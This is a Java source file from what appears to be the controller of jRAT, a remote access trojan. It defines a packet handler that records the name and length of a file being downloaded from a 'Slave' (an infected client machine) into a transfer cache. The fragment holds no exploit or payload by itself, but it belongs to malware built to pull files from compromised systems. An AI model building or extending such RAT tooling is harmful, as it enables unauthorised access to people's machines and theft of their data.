package jrat.controller.packets.incoming;

import jrat.common.io.FileCache;
import jrat.common.io.TransferData;
import jrat.controller.Slave;
import java.io.DataInputStream;


public class Packet30BeginServerDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String file = slave.readLine();
		long length = dis.readLong();
		
		TransferData data = FileCache.get(file);

		if (data != null) {
			data.setRemoteFile(file);
			data.setTotal(length);
			data.setObject(slave);
		}
	}

}